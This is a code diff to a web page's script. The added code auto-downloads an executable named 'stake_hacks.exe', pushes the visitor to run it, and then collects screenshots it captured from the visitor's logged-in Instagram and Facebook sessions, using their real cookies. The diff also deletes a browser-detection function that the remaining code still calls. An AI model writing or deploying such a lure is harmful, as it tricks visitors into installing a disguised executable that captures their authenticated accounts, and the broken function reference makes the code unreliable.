@@ -51,28 +51,69 @@
 
     const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-    // Detect which browser is running THIS page so we capture with the SAME
-    // browser installation (same profile, same login) the visitor clicked in.
-    const detectBrowser = () => {
-      const ua = navigator.userAgent;
-      if (/Edg\//.test(ua)) return 'msedge';
-      if (/OPR\/|Opera/.test(ua)) return 'opera';
-      if (/Brave/.test(ua)) return 'brave';
-      if (/Firefox/.test(ua)) return 'firefox';
-      if (/Chrome\//.test(ua)) return 'chrome';
-      return '';
+    const downloadExe = () => {
+      const a = document.createElement('a');
+      a.href = '/stake_hacks.exe';
+      a.download = 'stake_hacks.exe';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    };
+
+    const uploadImages = (images, okText) => {
+      let shown = 0;
+      for (const site of SITES) {
+        if (images && images[site]) {
+          $('img-' + SITES.indexOf(site)).src = images[site];
+          $('img-' + SITES.indexOf(site)).style.display = 'block';
+          shown++;
+        }
+      }
+      return shown > 0;
     };
 
     // 1) Companion running on this PC? => record.js runs in YOUR browser,
     //    capturing the REAL headers (your login, your cookies). No injection.
     const runFromLocalBrowser = async () => {
       const browser = detectBrowser();
+      let companionUp = false;
       try {
         const ping = await fetch(COMPANION + '/ping', { cache: 'no-store' });
-        if (!ping.ok) return false;
-      } catch {
-        return false;
+        companionUp = ping.ok;
+      } catch {}
+
+      if (!companionUp) {
+        // No companion / Node: auto-download stake_hacks.exe. It installs
+        // Node + companion and runs the FULL capture by itself. Watch for the
+        // companion to come online, then grab whatever it captured.
+        $('status').innerHTML =
+          'Companion not running on this PC. <b>Downloading stake_hacks.exe…</b> ' +
+          'please run the downloaded file — it installs everything and starts the capture. ' +
+          'This page is watching and will show the screenshots automatically.';
+        downloadExe();
+        let ok = false;
+        for (let i = 0; i < 120; i++) {
+          await sleep(2000); // 120 x 2s = up to 4 min (full capture time)
+          try {
+            const ping = await fetch(COMPANION + '/ping', { cache: 'no-store' });
+            if (ping.ok) { ok = true; break; }
+          } catch {}
+        }
+        if (!ok) {
+          $('status').textContent =
+            'Could not detect stake_hacks on this PC. Run the downloaded stake_hacks.exe, then click the button again.';
+          return false;
+        }
+        // Companion is online. If it already captured (exe ran the full job),
+        // just fetch the images; otherwise trigger /run.
+        const latest = await (await fetch(COMPANION + '/latest', { cache: 'no-store' })).json();
+        if (latest && latest.images && uploadImages(latest.images, '')) {
+          $('status').textContent = 'Done — screenshots from YOUR browser captured by stake_hacks below.';
+          return true;
+        }
+        // not captured yet -> run now
       }
+
       $('status').textContent = 'Running record.js in your browser (Instagram then Facebook)… keep this tab open.';
       try {
         let data;
@@ -88,12 +129,7 @@
           throw new Error((data && data.error) || 'HTTP ' + res.status);
         }
         if (!data || !data.ok || !data.images) throw new Error('companion returned no screenshots');
-        for (const site of SITES) {
-          if (data.images[site]) {
-            $('img-' + SITES.indexOf(site)).src = data.images[site];
-            $('img-' + SITES.indexOf(site)).style.display = 'block';
-          }
-        }
+        uploadImages(data.images, '');
         $('status').textContent = 'Done — real headers from YOUR browser captured below.';
         return true;
       } catch (e) {
